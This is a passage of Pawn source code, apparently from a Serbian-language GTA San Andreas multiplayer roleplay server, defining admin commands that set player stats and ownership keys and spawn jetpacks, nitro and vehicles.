        if(PlayerInfo[id][xPasos] == 1) return SendErrorMessage(playerid, "Igrac vec ima pasos!");
        PlayerInfo[ id ][ xPasos ] = 1; SavePlayer( id );
        
        SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio pasos!",ImeIgraca( playerid ));
        SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu %s pasos!", ImeIgraca( id ));
        format( string1, sizeof( string1 ), "Admin %s je postavio pasos igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
    }
	else if(strcmp(odabir,"skin",true) == 0)
	{
		if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina < 1 || kolicina > 311 ) return SendErrorMessage( playerid, "Broj skina ide od 1 do 311." );
		PlayerInfo[ id ][ xSkin ] = kolicina; SavePlayer( id ); PostaviSkin( id, kolicina );
		
        SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio skin ID: %d.",ImeIgraca( playerid ) , kolicina );
		SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s skind ID: %d.", ImeIgraca( id ) , kolicina );
        format( string1, sizeof( string1 ), "Admin %s je postavio skin %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
	}
	else if(strcmp(odabir,"godine",true) == 0)
	{
		if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
	    PlayerInfo[ id ][ xGodine ] = kolicina; SavePlayer( id );
        SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio godine: %d.",ImeIgraca( playerid ) , kolicina );
		SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s godine: %d.", ImeIgraca( id ) , kolicina );
        format( string1, sizeof( string1 ), "Admin %s je postavio godine na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
	}
    else if(strcmp(odabir,"mats",true) == 0)
    {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
        if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
        PlayerInfo[ id ][ xMaterijali ] = kolicina; SavePlayer( id );
        SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio materijale: %d.",ImeIgraca( playerid ) , kolicina );
        SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s materijale: %d.", ImeIgraca( id ) , kolicina );
        format( string1, sizeof( string1 ), "Admin %s je postavio materijale na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
    }
	else if(strcmp(odabir,"pol",true) == 0)
	{
		if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina < 1 || kolicina > 2 ) return SendErrorMessage( playerid, "Pol 1-musko , 2-zensko." );
		if( kolicina == 1 )
		{
		    PlayerInfo[ id ][ xPol ] = kolicina; SavePlayer( id );
	        SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio pol: musko.",ImeIgraca( playerid ) );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s pol: musko.", ImeIgraca( id ) );
            format( string1, sizeof( string1 ), "Admin %s je postavio muski pol igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		}
		else if( kolicina == 2 )
		{
			PlayerInfo[ id ][ xPol ] = kolicina; SavePlayer( id );
	        SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio pol: zensko.",ImeIgraca( playerid ) );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s pol: zensko.", ImeIgraca( id ) );
            format( string1, sizeof( string1 ), "Admin %s je postavio zenski pol igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		}
	}
	else if(strcmp(odabir,"posao",true) == 0) return SendErrorMessage(playerid, "Koristi /setjob");

	else if(strcmp(odabir,"respekt",true) == 0)
	{
		if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
	    PlayerInfo[ id ][ xRespekt ] = kolicina; SavePlayer( id );
        SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio respekte na: %d.",ImeIgraca( playerid ) , kolicina );
		SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s respekte na: %d.", ImeIgraca( id ) , kolicina );
    	format( string1, sizeof( string1 ), "Admin %s je postavio respekte na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
	}
    else if(strcmp(odabir,"vozilo1",true) == 0) {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina == -1 ) {
			PlayerInfo[ id ][ xVoziloID ][ 0 ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc vozila1: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc vozila1: %d.", ImeIgraca( id ), kolicina );
            format( string1, sizeof( string1 ), "Admin %s je skinuo kljuc vozila1 igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		}
		else {
		    new ImaFajl[ 50 ],ImaSFajl[ 50 ];
        	format( ImaFajl, sizeof( ImaFajl ), V_FILE, kolicina );
        	format( ImaSFajl, sizeof( ImaSFajl ), V_FILE, PlayerInfo[ id ][ xVoziloID ][ 0 ] );
		    if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "To vozilo ne postoji." );
		    if( VehicleInfo[ kolicina ][ vUsage ] != PRIVATNO_VOZILO ) return SendErrorMessage( playerid, "Mozete samo privatna vozila da menjate." );
			PlayerInfo[ id ][ xVoziloID ][ 0 ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc vozila1: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc vozila1: %d.", ImeIgraca( id ), kolicina );
			VehicleInfo[ kolicina ][ vOwned ] = 1; VehicleInfo[ kolicina ][ vLocked ] = 0;
			VehicleInfo[ kolicina ][ vNeaktivnost ] = 0; VehicleInfo[ kolicina ][ vPrice ] = VehPrice[ VehicleInfo[ kolicina ][ vModel ]- 400 ][ 1 ];
			strmid( VehicleInfo[ kolicina ][ vOwner ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 32);  SaveVehicle( kolicina );
			

            format( string1, sizeof( string1 ), "Admin %s je postavio kljuc vozila1 na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
		}
	}
	else if(strcmp(odabir,"vozilo2",true) == 0) {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina == -1 ) {
			PlayerInfo[ id ][ xVoziloID ][ 1 ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc vozila2: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc vozila2: %d.", ImeIgraca( id ), kolicina );
            format( string1, sizeof( string1 ), "Admin %s je skinuo kljuc vozila2 igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		}
		else {
		    new ImaFajl[ 50 ],ImaSFajl[ 50 ];
        	format( ImaFajl, sizeof( ImaFajl ), V_FILE, kolicina );
        	format( ImaSFajl, sizeof( ImaSFajl ), V_FILE, PlayerInfo[ id ][ xVoziloID ][ 1 ] );
		    if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "To vozilo ne postoji." );
		    if( VehicleInfo[ kolicina ][ vUsage ] != PRIVATNO_VOZILO ) return SendErrorMessage( playerid, "Mozete samo privatna vozila da menjate." );
			PlayerInfo[ id ][ xVoziloID ][ 1 ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc vozila2: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc vozila2: %d.", ImeIgraca( id ), kolicina );
			VehicleInfo[ kolicina ][ vOwned ] = 1; VehicleInfo[ kolicina ][ vLocked ] = 0;
			VehicleInfo[ kolicina ][ vNeaktivnost ] = 0; VehicleInfo[ kolicina ][ vPrice ] = VehPrice[ VehicleInfo[ kolicina ][ vModel ]- 400 ][ 1 ];
			strmid( VehicleInfo[ kolicina ][ vOwner ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 32);  SaveVehicle( kolicina );

			format( string1, sizeof( string1 ), "Admin %s je postavio kljuc vozila2 na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
		}
	}
	else if(strcmp(odabir,"vozilo3",true) == 0) {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina == -1 ) {
			PlayerInfo[ id ][ xVoziloID ][ 2 ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc vozila3: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc vozila3: %d.", ImeIgraca( id ), kolicina );
            format( string1, sizeof( string1 ), "Admin %s je skinuo kljuc vozila3 igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		}
		else {
		    new ImaFajl[ 50 ],ImaSFajl[ 50 ];
        	format( ImaFajl, sizeof( ImaFajl ), V_FILE, kolicina );
        	format( ImaSFajl, sizeof( ImaSFajl ), V_FILE, PlayerInfo[ id ][ xVoziloID ][ 2 ] );
		    if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "To vozilo ne postoji." );
		    if( VehicleInfo[ kolicina ][ vUsage ] != PRIVATNO_VOZILO ) return SendErrorMessage( playerid, "Mozete samo privatna vozila da menjate." );
			PlayerInfo[ id ][ xVoziloID ][ 2 ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc vozila3: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc vozila3: %d.", ImeIgraca( id ), kolicina );
			VehicleInfo[ kolicina ][ vOwned ] = 1; VehicleInfo[ kolicina ][ vLocked ] = 0;
			VehicleInfo[ kolicina ][ vNeaktivnost ] = 0; VehicleInfo[ kolicina ][ vPrice ] = VehPrice[ VehicleInfo[ kolicina ][ vModel ]- 400 ][ 1 ];
			strmid( VehicleInfo[ kolicina ][ vOwner ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 32);  SaveVehicle( kolicina );

            format( string1, sizeof( string1 ), "Admin %s je postavio kljuc vozila3 na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
		}
	}
	else if(strcmp(odabir,"vozilo4",true) == 0) {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina == -1 ) {
			PlayerInfo[ id ][ xVoziloID ][ 3 ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc vozila4: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc vozila4: %d.", ImeIgraca( id ), kolicina );

            format( string1, sizeof( string1 ), "Admin %s je skinuo kljuc vozila4 igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		}
		else {
		    new ImaFajl[ 50 ],ImaSFajl[ 50 ];
        	format( ImaFajl, sizeof( ImaFajl ), V_FILE, kolicina );
        	format( ImaSFajl, sizeof( ImaSFajl ), V_FILE, PlayerInfo[ id ][ xVoziloID ][ 3 ] );
		    if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "To vozilo ne postoji." );
		    if( VehicleInfo[ kolicina ][ vUsage ] != PRIVATNO_VOZILO ) return SendErrorMessage( playerid, "Mozete samo privatna vozila da menjate." );
			PlayerInfo[ id ][ xVoziloID ][ 3 ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc vozila4: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc vozila4: %d.", ImeIgraca( id ), kolicina );
			VehicleInfo[ kolicina ][ vOwned ] = 1; VehicleInfo[ kolicina ][ vLocked ] = 0;
			VehicleInfo[ kolicina ][ vNeaktivnost ] = 0; VehicleInfo[ kolicina ][ vPrice ] = VehPrice[ VehicleInfo[ kolicina ][ vModel ]- 400 ][ 1 ];
			strmid( VehicleInfo[ kolicina ][ vOwner ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 32);  SaveVehicle( kolicina );

            format( string1, sizeof( string1 ), "Admin %s je postavio kljuc vozila4 na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
		}
	}
	else if(strcmp(odabir,"firma",true) == 0) {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina == -1 ) {
			PlayerInfo[ id ][ xFirmaID ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc firme: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc firme: %d.", ImeIgraca( id ), kolicina );
            format( string1, sizeof( string1 ), "Admin %s je skinuo kljuc firme igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		}
		else {
		    new ImaFajl[ 50 ],ImaSFajl[ 50 ];
        	format( ImaFajl, sizeof( ImaFajl ), F_FILE, kolicina );
        	format( ImaSFajl, sizeof( ImaSFajl ), F_FILE, PlayerInfo[ id ][ xFirmaID ] );
		    if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta firma ne postoji." );
			PlayerInfo[ id ][ xFirmaID ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc firme: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc firme: %d.", ImeIgraca( id ), kolicina );
			BussinesInfo[ kolicina ][ bOwned ] = 1; BussinesInfo[ kolicina ][ bLocked ] = 0;
			BussinesInfo[ kolicina ][ bNeaktivnost ] = 0;
			strmid( BussinesInfo[ kolicina ][ bOwner ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 32);
			Bussines_Refresh( kolicina ); SaveBussines( kolicina );

            format( string1, sizeof( string1 ), "Admin %s je postavio kljuc firme na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
		}
	}
	else if(strcmp(odabir,"garaza",true) == 0) {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina == -1 ) {
			PlayerInfo[ id ][ xGarageID ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc garaze: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc garaze: %d.", ImeIgraca( id ), kolicina );
			format( string1, sizeof( string1 ), "Admin %s je skinuo kljuc garaze igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		}
		else {
		    new ImaFajl[ 50 ],ImaSFajl[ 50 ];
        	format( ImaFajl, sizeof( ImaFajl ), F_GARAGE, kolicina );
        	format( ImaSFajl, sizeof( ImaSFajl ), F_GARAGE, PlayerInfo[ id ][ xGarageID ] );
		    if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta garaza ne postoji." );
			PlayerInfo[ id ][ xGarageID ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc garaze: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc garaze: %d.", ImeIgraca( id ), kolicina );
			garageInfo[ kolicina ][ garageOwned ] = true; garageInfo[ kolicina ][ garageLocked ] = false;
			strmid( garageInfo[ kolicina ][ garageOwner ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 32);
			Garage_Refresh( kolicina ); Garage_Save( kolicina );

            format( string1, sizeof( string1 ), "Admin %s je postavio kljuc garaze na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
		}
	}
	else if(strcmp(odabir,"imovina1",true) == 0) {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina == -1 ) {
			PlayerInfo[ id ][ xProperty ][ 0 ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc imovine 1: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc imovine 1: %d.", ImeIgraca( id ), kolicina );
            format( string1, sizeof( string1 ), "Admin %s je skinuo kljuc imovine1 igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		}
		else {
		    new ImaFajl[ 50 ],ImaSFajl[ 50 ];
        	format( ImaFajl, sizeof( ImaFajl ), IM_FILE, kolicina );
        	format( ImaSFajl, sizeof( ImaSFajl ), IM_FILE, PlayerInfo[ id ][ xProperty ][ 0 ] );
		    if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );
			PlayerInfo[ id ][ xProperty ][ 0  ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc imovine 1: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc imovine 1: %d.", ImeIgraca( id ), kolicina );
			II[ kolicina ][ iOwned ] = 1; II[ kolicina ][ iLocked ] = 0;
			II[ kolicina ][ iNeaktivnost ] = 0;
			strmid( II[ kolicina ][ iOwner ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 32);
			SaveProperty( kolicina ); PropertyRefresh( kolicina );

            format( string1, sizeof( string1 ), "Admin %s je postavio kljuc imovine1 na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
		}
	}
	else if(strcmp(odabir,"imovina2",true) == 0) {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina == -1 ) {
			PlayerInfo[ id ][ xProperty ][ 1 ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc imovine 2: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc imovine 2: %d.", ImeIgraca( id ), kolicina );
			format( string1, sizeof( string1 ), "Admin %s je skinuo kljuc imovine2 igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		}
		else {
		    new ImaFajl[ 50 ],ImaSFajl[ 50 ];
        	format( ImaFajl, sizeof( ImaFajl ), IM_FILE, kolicina );
        	format( ImaSFajl, sizeof( ImaSFajl ), IM_FILE, PlayerInfo[ id ][ xProperty ][ 1 ] );
		    if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );
			PlayerInfo[ id ][ xProperty ][ 1  ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc imovine 2: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc imovine 2: %d.", ImeIgraca( id ), kolicina );
			II[ kolicina ][ iOwned ] = 1; II[ kolicina ][ iLocked ] = 0;
			II[ kolicina ][ iNeaktivnost ] = 0;
			strmid( II[ kolicina ][ iOwner ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 32);
			SaveProperty( kolicina ); PropertyRefresh( kolicina );

            format( string1, sizeof( string1 ), "Admin %s je postavio kljuc imovine2 na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
		}
	}
	else if(strcmp(odabir,"imovina3",true) == 0) {
        if( PlayerInfo[ playerid ][ xAdmin ] < 6) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
		if( kolicina == -1 ) {
			PlayerInfo[ id ][ xProperty ][ 2 ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc imovine 3: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc imovine 3: %d.", ImeIgraca( id ), kolicina );
			format( string1, sizeof( string1 ), "Admin %s je skinuo kljuc imovine3 igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
		}
		else {
		    new ImaFajl[ 50 ],ImaSFajl[ 50 ];
        	format( ImaFajl, sizeof( ImaFajl ), IM_FILE, kolicina );
        	format( ImaSFajl, sizeof( ImaSFajl ), IM_FILE, PlayerInfo[ id ][ xProperty ][ 2 ] );
		    if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );
			PlayerInfo[ id ][ xProperty ][ 2  ] = kolicina; SavePlayer( id );
			SendClientMessageEx( id, SVETLOPLAVA, " Admin %s vam je postavio kljuc imovine 3: %d.", ImeIgraca( playerid ), kolicina );
			SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s kljuc imovine 3: %d.", ImeIgraca( id ), kolicina );
			II[ kolicina ][ iOwned ] = 1; II[ kolicina ][ iLocked ] = 0;
			II[ kolicina ][ iNeaktivnost ] = 0;
			strmid( II[ kolicina ][ iOwner ], ImeIgraca( id ), 0, strlen( ImeIgraca( id ) ), 32);
			SaveProperty( kolicina ); PropertyRefresh( kolicina );

            format( string1, sizeof( string1 ), "Admin %s je postavio kljuc imovine3 na %d igracu %s.", ImeIgraca( playerid ), kolicina, ImeIgraca( id ) );
		}

	}
	LogSave( "Ostalo/LogSetStatAdmin.log", string1 );
	return true;
}

CMD:hidenames( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	foreach( Player, i ) ShowPlayerNameTagForPlayer( playerid, i, false );
	SCM( playerid, BELA, "Sklonili ste imena!");
	return 1;
}

CMD:shownames( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	foreach( Player, i ) ShowPlayerNameTagForPlayer( playerid, i, true );
	SCM( playerid, BELA, "Sklonili ste imena!");
	return 1;
}

CMD:jetpack( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	new Float:Pos[ 3 ];
	if( GetPlayerSpecialAction( playerid ) == SPECIAL_ACTION_USEJETPACK ) {
		GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
		SetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ]+2 );
		SendInfoMessage( playerid, "Skinuo si jetpack te je unisten." );
	}
	else {
	    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_USEJETPACK);
	    SendInfoMessage( playerid, "Uzeo si JetPack.");
   	}
	return 1;
}

CMD:nitro( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    // if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
    if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu!");

	AddVehicleComponent( GetPlayerVehicleID( playerid ), 1010 );
	SendInfoMessage( playerid, "Nitro je uspesno dodat u vozilo!" );
    return true;
}

CMD:veh( playerid, params[] ) {
    if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SCM( playerid, SVETLOCRVENA, "| V:AC | Nemoguce je trenutno kreirati vozilo, limit vozila na serveru je dosegnut.");
	if( PlayerInfo[ playerid ][ xAdmin ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu. Koristi /aveh" );
    // if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

    if( AdminVozilo[ playerid ] == -1 ) {
		new idv,b1,b2;
		if( sscanf( params ,"iii", idv, b1, b2 ) ) return SendUsageMessage( playerid, "/veh [ id ] [ boja 1 ] [ boja 2 ]");
		if( idv < 400 || idv > 611 ) return SendErrorMessage( playerid, "ID vozila ne moze biti manji od 400 ili veci od 611!");
		if( b1 < 0 || b2 < 0 || b1 > 255 || b2 > 255 ) return SendErrorMessage( playerid, "ID boje ne moze biti manji od 0 ili veci od 255!");

		new Float:Poz[ 3 ];
		GetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
        Novi_DestroyVehicle(AdminVozilo[playerid]);
		AdminVozilo[ playerid ] = V01D_CreateVehicle(idv, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ], 0.0, b1, b2, -1 );
        Novi_PutPlayerInVehicle(playerid, AdminVozilo[playerid], 0);
		
		SendInfoMessage( playerid, "Vozilo ID: %d je stvoreno.", AdminVozilo[ playerid ] );

        // if(KreiranAutoSalon[ playerid ] == -1) {
        //     new string[32];
        //     format(string, sizeof(string), "[ A/H %s ]", ImeIgraca(playerid));
        //     AdminVehLabel[playerid] = CreateDynamic3DTextLabel(string, SRVBOJA1,  Poz[ 0 ], Poz[ 1 ], Poz[ 2 ]+1.0, 20.0, INVALID_PLAYER_ID, AdminVozilo[ playerid ], 0, -1, -1, -1, 20.0, -1, 0);
        // }

	}
	else if( AdminVozilo[ playerid ] != -1 ) {
	    SendInfoMessage( playerid, "Vozilo ID: %d je unisteno.", AdminVozilo[ playerid ] );
		Novi_DestroyVehicle( AdminVozilo[ playerid ] );
        // DestroyDynamic3DTextLabel(AdminVehLabel[playerid]);
		AdminVozilo[ playerid ] = -1;
	}
	return true;
}

CMD:fixveh( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 || PlayerInfo[ playerid ][ xVIPLevel ] >= 1 ) {
    
		if( PlayerInfo[ playerid ][ xSupporter ] >= 1 || ( PlayerInfo[ playerid ][ xAdmin ] >= 1 && PlayerInfo[ playerid ][ xAdmin ] <= 6 ) ) {
		    if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
			//if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		}
		else if( PlayerInfo[ playerid ][ xVIPLevel ] >= 1 ) {
            if(VipFix[playerid] != 0) return SendErrorMessage(playerid, "Moras sacekati malo pre sledeceg fixanja!");
			if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na trci." );
			if( PlayerCP[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na eventu." );
		    if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes fixati vozilo dok imas wanted level." );
		}

